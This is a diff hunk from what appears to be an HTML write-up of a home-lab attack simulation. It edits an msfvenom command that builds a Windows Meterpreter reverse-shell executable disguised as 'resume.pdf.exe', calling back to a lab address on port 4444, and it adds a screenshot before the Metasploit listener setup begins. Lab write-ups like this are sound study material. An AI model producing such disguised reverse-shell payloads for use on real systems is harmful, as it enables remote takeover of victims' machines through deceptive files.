@@ -36,9 +36,13 @@
 
 <p>Next, I used msfvenom to generate a simple Meterpreter reverse shell payload:</p>
 
-<pre>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f exe -o resume.pdf.exe</pre>
+<pre>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.100 lport=4444 -f exe -o resume.pdf.exe</pre>
 
 <p>This creates an executable file named resume.pdf.exe that, when executed, will attempt to connect back to the Kali Linux machine on port 4444.</p>
+
+<p align="center">
+    <img src="https://github.com/bagaskarapd/Attack-Simulation/blob/main/Screenshots/Msfvenom.png?raw=true">
+</p>
 
 <p>I then set up a listener in Metasploit to catch the reverse shell:</p>
 <pre>
